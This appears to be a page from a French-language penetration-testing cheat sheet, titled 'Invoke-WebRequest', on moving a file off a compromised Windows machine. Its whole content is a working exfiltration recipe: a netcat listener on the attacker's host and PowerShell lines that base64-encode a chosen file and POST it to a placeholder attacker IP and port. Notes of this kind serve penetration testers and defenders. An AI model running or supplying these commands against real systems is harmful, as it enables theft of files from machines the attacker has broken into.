---
description: >-
  Permet d'envoyer un document depuis une machine compromise vers la machine
  d'attaque
---

# Invoke-WebRequest

```
# Sur la machine d'attaque
nc -lvp <PORT> > <FILE>

# Sur la machine compromise
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\<PATH>\<FILE>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:<PORT> -Method POST -Body $b64
```
